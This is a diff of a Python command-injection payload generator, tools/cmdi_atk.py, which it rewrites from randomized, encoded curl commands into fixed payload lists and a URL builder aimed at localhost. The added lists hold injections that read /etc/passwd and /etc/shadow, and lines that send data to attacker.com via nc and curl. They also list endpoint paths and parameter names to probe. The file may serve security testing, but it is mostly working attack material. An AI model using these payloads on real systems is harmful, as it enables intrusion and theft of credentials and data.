@@ -1,86 +1,60 @@
+"""
+tools/cmdi_atk.py — Command Injection attack payload generator
+"""
 import random
-import urllib.parse
 
-TARGET = "http://localhost/test?"
-
-PARAMS = [
-    "ip", "host", "target", "cmd",
-    "query", "user", "name", "data"
+_SEMICOLON = [
+    "id;whoami",
+    "ls;cat /etc/passwd",
+    "echo hello;id",
+    ";cat /etc/shadow",
+    "whoami;uname -a",
 ]
 
-SEPARATORS = [
-    ";",
-    "&&",
-    "||",
-    "|",
-    "&"
+_PIPE = [
+    "ls | whoami",
+    "cat /etc/passwd | nc attacker.com 4444",
+    "id | curl http://attacker.com/?out=$(id)",
+    "whoami | base64",
 ]
 
-COMMANDS = [
-    "whoami",
-    "id",
-    "ls",
-    "cat /etc/passwd",
-    "pwd",
-    "uname -a",
-    "dir",
-    "type C:\\Windows\\win.ini",
-    "ping 127.0.0.1",
-    "echo test",
-    "netstat -an"
+_AND = [
+    "id && whoami",
+    "ping -c 1 127.0.0.1 && id",
+    "echo test && cat /etc/passwd",
+    "dir && whoami",
+    "ipconfig && net user",
 ]
 
-SUBSHELL_PATTERNS = [
-    lambda cmd: f"`{cmd}`",
-    lambda cmd: f"$({cmd})",
-    lambda cmd: f"${{{cmd}}}"
+_BACKTICK = [
+    "`id`",
+    "`cat /etc/passwd`",
+    "`whoami`",
 ]
 
-def random_case(s):
-    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
+_NEWLINE = [
+    "valid_input\nwhoami",
+    "test\ncat /etc/passwd",
+    "data\nid\nls -la",
+]
 
-def maybe_encode(s):
-    if random.random() > 0.5:
-        s = urllib.parse.quote(s)
-    if random.random() > 0.7:
-        s = urllib.parse.quote(s)
-    return s
+_WINDOWS = [
+    "cmd.exe /c whoami",
+    "| net user",
+    "& ipconfig",
+    "; dir C:\\",
+    "cmd /c dir",
+]
 
-def maybe_noise_wrap(s):
-    wrappers = [
-        lambda x: x,
-        lambda x: "abc" + x,
-        lambda x: x + "123",
-        lambda x: "test" + x + "data"
-    ]
-    return random.choice(wrappers)(s)
+ALL_PAYLOADS = _SEMICOLON + _PIPE + _AND + _BACKTICK + _NEWLINE + _WINDOWS
 
-def generate_payload():
-    base_value = "127.0.0.1"
+CMDI_PATHS  = ["/exec", "/run", "/ping", "/cmd", "/execute", "/api/exec", "/system"]
+CMDI_PARAMS = ["cmd", "command", "exec", "host", "input", "query", "run"]
 
-    if random.random() > 0.6:
-        cmd = random.choice(COMMANDS)
-        payload = random.choice(SUBSHELL_PATTERNS)(cmd)
-    else:
-        sep = random.choice(SEPARATORS)
-        cmd = random.choice(COMMANDS)
-        payload = base_value + sep + cmd
 
-    if random.random() > 0.5:
-        payload = random_case(payload)
-
-    payload = maybe_noise_wrap(payload)
-    payload = maybe_encode(payload)
-
-    return payload
-
-generated = set()
-
-while len(generated) < 100:
-    param = random.choice(PARAMS)
-    payload = generate_payload()
-    curl_cmd = f'curl "{TARGET}{param}={payload}"'
-    generated.add(curl_cmd)
-
-for cmd in generated:
-    print(cmd)
+def generate() -> tuple[str, str]:
+    payload = random.choice(ALL_PAYLOADS)
+    path    = random.choice(CMDI_PATHS)
+    param   = random.choice(CMDI_PARAMS)
+    url     = f"http://localhost:8000{path}?{param}={payload}"
+    return url, payload
